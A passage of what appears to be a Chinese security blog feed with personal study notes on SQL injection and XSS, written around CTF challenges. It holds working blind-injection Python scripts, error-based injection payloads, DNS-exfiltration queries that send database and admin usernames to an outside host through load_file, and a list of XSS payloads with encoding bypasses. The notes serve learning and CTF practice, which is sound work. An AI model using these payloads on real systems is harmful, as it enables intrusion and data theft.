requests</span><br><span class="line">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">url &#x3D; &#39;&#39;</span><br><span class="line">data &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0,50):</span><br><span class="line">    for j in dic:</span><br><span class="line">        #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)</span><br><span class="line">        #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag2&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)p</span><br><span class="line">        payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select binary group_concat(flag2) from flag2),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)</span><br><span class="line">        r &#x3D; s.get(url&#x3D;payload)</span><br><span class="line">        if &#39;Nobody&#39; not in r.text:</span><br><span class="line">            data +&#x3D; j</span><br><span class="line">            break</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure><p>同时了解一下报错注入</p><p>好像注入的时候是不需要select的，但在mysql中是需要的</p><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200816164858101.png" alt="image-20200816164858101"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1%27%20and%20updatexml(1,concat(%27~%27,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database())),1)%20--+</span><br></pre></td></tr></table></figure><h3 id="ctfhub（if布尔盲注）"><a href="#ctfhub（if布尔盲注）" class="headerlink" title="ctfhub（if布尔盲注）"></a>ctfhub（if布尔盲注）</h3><p>根据题目可知用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(a,b,c) a对就执行b，否则就执行c</span><br></pre></td></tr></table></figure><p>这个题目正好是id=1,2会对，3就错所以我们把b=1或2，c为3</p><p>接下来写脚本就可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class="line">url &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">for i in range(0,50):</span><br><span class="line">    for j in dic:</span><br><span class="line">        payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((mid((select database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),1,3)&quot;.format(i,j)</span><br><span class="line">        r &#x3D; s.get(url&#x3D;payload)</span><br><span class="line">        if &#39;query_success&#39; in r.text:</span><br><span class="line">            flag +&#x3D;j</span><br><span class="line">            break</span><br><span class="line">    print(flag)</span><br><span class="line">#表</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i,j)</span><br><span class="line">#列</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j)</span><br><span class="line">#flag</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-9a3dce74d8324220.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if(substr((select group_concat(flag)from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;,1,3)&quot;.format(i, j)</span><br></pre></td></tr></table></figure><p>不过中间好像是服务器会关闭所以我们可以分组扫描</p><p>比如从1-30，30-50</p><h3 id="ctfhub（if时间盲注）"><a href="#ctfhub（if时间盲注）" class="headerlink" title="ctfhub（if时间盲注）"></a>ctfhub（if时间盲注）</h3><p>和上一题一样直接写脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">dic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;</span><br><span class="line">url &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line">for i in range(0,50):</span><br><span class="line">    for j in dic:</span><br><span class="line">        try:</span><br><span class="line">            payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class="line">            r &#x3D; s.get(url&#x3D;payload,timeout&#x3D;1)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            flag +&#x3D;j</span><br><span class="line">            break</span><br><span class="line">    print(flag)</span><br><span class="line">#表</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class="line">#列</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br><span class="line">#flag</span><br><span class="line">payload &#x3D; &quot;http:&#x2F;&#x2F;challenge-72a758b783b1a2c2.sandbox.ctfhub.com:10080&#x2F;?id&#x3D;if((substr((select group_concat(flag) from flag),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;),sleep(2),1)&quot;.format(i,j)</span><br></pre></td></tr></table></figure><h3 id="3-基于报错的SQL盲注"><a href="#3-基于报错的SQL盲注" class="headerlink" title="3.基于报错的SQL盲注"></a>3.基于报错的SQL盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">' and updataxml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+   //查看用户</span></span><br><span class="line"><span class="string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+  //查看数据库</span></span><br><span class="line"><span class="string">'</span> <span class="keyword">and</span> updataxml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+    //查看数据库的名字</span></span><br><span class="line"><span class="string">' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='</span><span class="keyword">test</span> <span class="string">' limit 0,1),0x7e),1) --+     //查看各表的名字</span></span><br><span class="line"><span class="string">'</span><span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'my student'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+   //查看列的名字</span></span><br></pre></td></tr></table></figure><h2 id="4-二次注入"><a href="#4-二次注入" class="headerlink" title="4.二次注入"></a>4.二次注入</h2><h3 id="0x01二次注入原理"><a href="#0x01二次注入原理" class="headerlink" title="0x01二次注入原理"></a>0x01二次注入原理</h3><p><strong>防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</strong></p><ul><li><p>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p></li><li><p>第二步：引用恶意数据<br>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p></li></ul><h2 id="5-DNS注入"><a href="#5-DNS注入" class="headerlink" title="5.DNS注入"></a>5.DNS注入</h2><h3 id="0x01DNS"><a href="#0x01DNS" class="headerlink" title="0x01DNS"></a>0x01DNS</h3><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200609202338069.png" alt="image-20200609202338069"></p><h3 id="0x02注入函数"><a href="#0x02注入函数" class="headerlink" title="0x02注入函数"></a>0x02注入函数</h3><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200609203639074.png" alt="image-20200609203639074"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;D:&#x2F;1.txt&quot;);  &#x2F;&#x2F;读取文件</span><br><span class="line">select load_file(&quot;\\\\xxx.php90.cn\\ccc&quot;)      &#x2F;&#x2F;转义</span><br></pre></td></tr></table></figure><h3 id="0x03注入"><a href="#0x03注入" class="headerlink" title="0x03注入"></a>0x03注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&quot;\\\\&quot;,(select database()),&quot;xxx.php90.cn\\cc&quot;));</span><br><span class="line">select load_file(concat(&quot;\\\\&quot;,(select username from admin),&quot;xxx.php90.cn\\cc&quot;));</span><br><span class="line">select load_file(concat(&quot;\\\\&quot;,select HEX(username) from admin limit 0,1),&quot;xxx.php90.cn\\cc&quot;));</span><br></pre></td></tr></table></figure><h2 id="6-报错注入"><a href="#6-报错注入" class="headerlink" title="6.报错注入"></a>6.报错注入</h2><p>更详细的解释<a href="https://xz.aliyun.com/t/253" target="_blank" rel="noopener">https://xz.aliyun.com/t/253</a></p><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。</p><p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这里主要记录一下<code>xpath语法错误</code>和<code>concat+rand()+group_by()导致主键重复</code></p><h3 id="xpath语法错误"><a href="#xpath语法错误" class="headerlink" title="xpath语法错误"></a>xpath语法错误</h3><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数。<br>使用条件：mysql版本&gt;5.1.5</p><p><strong>extractvalue函数</strong></p><blockquote><p>函数原型：extractvalue(xml_document,Xpath_string)<br>正常语法：extractvalue(xml_document,Xpath_string);<br>第一个参数：xml_document是string格式，为xml文档对象的名称<br>第二个参数：Xpath_string是xpath格式的字符串<br>作用：从目标xml中返回包含所查询值的字符串</p></blockquote><p>第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</p><p>pyload：<code>id=&#39;and(select extractvalue(&quot;anything&quot;,concat(&#39;~&#39;,(select语句))))</code></p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))</span><br><span class="line">id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,@@version)))</span><br><span class="line">12</span><br></pre></td></tr></table></figure><p>针对mysql数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查数据库名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">爆表名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))))</span><br><span class="line">爆字段名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;))))</span><br><span class="line">爆数据：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br><span class="line">1234</span><br></pre></td></tr></table></figure><p>注：</p><ul><li>① 0x7e=’~’</li><li>② concat(‘a’,‘b’)=“ab”</li><li>③ version()=@@version</li><li>④ ‘~‘可以换成’#’、’$’等不满足xpath格式的字符</li><li>⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</li></ul><p><strong>updatexml</strong></p><blockquote><p>函数原型：updatexml(xml_document,xpath_string,new_value)<br>正常语法：updatexml(xml_document,xpath_string,new_value)<br>第一个参数：xml_document是string格式，为xml文档对象的名称 第二个参数：xpath_string是xpath格式的字符串<br>第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值</p></blockquote><p>第二个参数跟extractvalue函数的第二个参数一样，因此也可以利用，且利用方式相同<br>payload：<code>id=&#39;and(select updatexml(&quot;anything&quot;,concat(&#39;~&#39;,(select语句())),&quot;anything&quot;))</code></p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;and(select updatexml(1,concat(&#39;~&#39;,(select database())),1))</span><br><span class="line">&#39;and(select updatexml(1,concat(0x7e,@@database),1))</span><br><span class="line">12</span><br></pre></td></tr></table></figure><p>同样，针对mysql：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class="line">爆表名：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database())),0x7e))</span><br><span class="line">爆列名：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="line">爆数据：&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br></pre></td></tr></table></figure><h3 id="concat-rand-group-by-导致主键重复"><a href="#concat-rand-group-by-导致主键重复" class="headerlink" title="concat+rand()+group_by()导致主键重复"></a>concat+rand()+group_by()导致主键重复</h3><p>这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。</p><p><strong>rand()：</strong></p><blockquote><p>生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字</p></blockquote><p><strong>floor()：</strong></p><blockquote><p>对任意正或者负的十进制值向下取整</p></blockquote><p>通常利用这两个函数的方法是<code>floor(rand(0))*2</code> ,其会生成0和1两个数</p><p><strong>group by</strong></p><blockquote><p>group by是根据一个或多个列对结果集进行分组的sql语句，其用法为：<br>SELECT column_name, aggregate_function(column_name)<br>FROM table_name<br>WHERE column_name operator value<br>GROUP BY column_name</p></blockquote><p>报错的原因是因为<strong>rand()函数在查询的时候会执行一次,插入的时候还会执行一次.</strong>这就是整个语句报错的关键</p><p>前面说过floor(rand(0)<em>2) 前六位是<em>*0110110</em></em></p><p><strong>group by x先建立一个空表,用于分组.</strong>然后进行分组查询,第一次rand()执行,查询的结果是0,因为是空表所以插入这条,而插入的时候rand()又执行了一次,所以表中的结果就是</p><p><a href="https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212511240-1317180655.png" target="_blank" rel="noopener"><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212511240-1317180655.png" alt="img"></a></p><p>第一次执行完,接着执行rand()的值为1,因为表中存在,所以加1,表中结果成为</p><p><a href="https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212558220-1728511223.png" target="_blank" rel="noopener"><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212558220-1728511223.png" alt="img"></a></p><p>到了第三次执行rand()是值为0,因为表中不存在所以要插入新的数据,<strong>这次插入rand()再次执行,所以插入的又是1.而表中已经存在1了</strong></p><p><strong>此时插入因为重复出现同一个key,就会出现报错 重复出现key.而报错中会说明那个key有问题,我们的key中结合了想要了解的字符串root@localhost</strong></p><p><strong>这样就实现了报错注入,拿到了自己想要的数据</strong></p><p><strong><a href="https://images2018.cnblogs.com/blog/1142103/201808/1142103-20180816212741685-206782122.png" target="_blank" rel="noopener"><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/1142103-20180816212741685-206782122.png" alt="img"></a></strong></p><p>这就是整个报错注入的原理了,rand(),floor() group by 函数缺一不可.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#payload</span><br><span class="line">1 Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</span><br></pre></td></tr></table></figure><p>看一下ctfhub报错注入</p><h3 id="ctfhub报错注入"><a href="#ctfhub报错注入" class="headerlink" title="ctfhub报错注入"></a>ctfhub报错注入</h3><p>查表</p><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200817145102761.png" alt="image-20200817145102761"></p><p>查flag</p><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200817145552296.png" alt="image-20200817145552296"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我就单纯想把这些东西存下来&lt;/p&gt;
&lt;h1 id=&quot;基础学习&quot;&gt;&lt;a href=&quot;#基础学习&quot; class=&quot;headerlink&quot; title=&quot;基础学习&quot;&gt;&lt;/a&gt;基础学习&lt;/h1&gt;&lt;h2 id=&quot;1-SQL注入的分类&quot;&gt;&lt;a href=&quot;#1-SQL注入的分类&quot; cl</summary>
      
    
    
    
    <category term="web" scheme="https://pz1o.top/categories/web/"/>
    
    
    <category term="web" scheme="https://pz1o.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>xss</title>
    <link href="https://pz1o.top/2020/12/09/xss/"/>
    <id>https://pz1o.top/2020/12/09/xss/</id>
    <published>2020-12-09T15:34:13.000Z</published>
    <updated>2020-12-09T15:36:11.388Z</updated>
    
    <content type="html"><![CDATA[<p>这篇更乱，也就那个小挑战还算完整</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="理解同步和异步："><a href="#理解同步和异步：" class="headerlink" title="理解同步和异步："></a>理解同步和异步：</h3><p>举个例子，比如有一个网页，html和php，php会延时执行。</p><p>同步：只有当php执行完之后，才会显示html网页。</p><p>异步：刷新之后，会立即显示html网页，之后再显示php执行的内容。</p><h3 id="js设置cookie"><a href="#js设置cookie" class="headerlink" title="js设置cookie"></a>js设置cookie</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie&#x3D;&quot;phpsessid&#x3D;      &quot;;</span><br></pre></td></tr></table></figure><h2 id="0x01存储xss"><a href="#0x01存储xss" class="headerlink" title="0x01存储xss"></a>0x01存储xss</h2><p>存储型xss主要是攻击者将xss代码插入到页面上，然后存在数据库里，当访问者访问这个页面时，就会导致xss代码执行。</p><p>出现场景：编辑内容（xss代码）可以保存，并且可以再次访问这个内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="0x02反射xss"><a href="#0x02反射xss" class="headerlink" title="0x02反射xss"></a>0x02反射xss</h2><p>攻击者在url中插入xss代码，服务器将url中的xss代码输入到页面上，攻击者将xss代码的url发送给用户，用户打开后受到xss攻击。</p><p>出现场景：url中可以传递参数</p><p>通常来说，会闭合一些标签，从而执行代码。</p><p>常用闭合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;</span><br><span class="line">&#39;&gt;</span><br><span class="line">&lt;&#x2F;xxx&gt;</span><br></pre></td></tr></table></figure><p>其实还是具体情况具体对待</p><h2 id="0x03dom型xss"><a href="#0x03dom型xss" class="headerlink" title="0x03dom型xss"></a>0x03dom型xss</h2><p>攻击者在url中插入xss代码，前端页面直接从url中获取xss代码并且输入到页面，导致xss代码的执行，攻击者将带有xss代码的url发送给用户，用户打开后受到xss攻击</p><p>关于反射型和dom型差别：</p><p>前端处理是dom，后端处理是反射</p><h1 id="常用修复函数"><a href="#常用修复函数" class="headerlink" title="常用修复函数"></a>常用修复函数</h1><p>strip_tags：过滤html标签</p><p>htmlspecialchars：将html标签转换为实体</p><h1 id="常用的payload"><a href="#常用的payload" class="headerlink" title="常用的payload"></a>常用的payload</h1><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">eval(</span>"<span class="attr">alert</span>('<span class="attr">xss</span>')")&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('xss')"</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(alert(</span>'<span class="attr">xss</span>'))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:aaa"</span> <span class="attr">onmouseover</span>=<span class="string">"alert(/xss/)"</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">需要用编码绕过时：</span><br><span class="line">Base64：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg</span>==&gt;</span>M</span><br><span class="line"></span><br><span class="line">urlencode：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E</span>&gt;</span>M </span><br><span class="line"></span><br><span class="line">HTML实体编码 ：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">eval(alert(</span>'<span class="attr">xss</span>'))&gt;</span>bb<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>'<span class="attr">xss</span>')&gt;</span>cc<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert('xss')<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"aaa"</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>') /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript<span class="symbol">&amp;colon;</span>prompt<span class="symbol">&amp;lpar;</span>`xss`<span class="symbol">&amp;rpar;</span>"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">alert(</span>'<span class="attr">xss</span>') <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>'<span class="attr">xss</span>') <span class="attr">bad</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">1</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> &gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 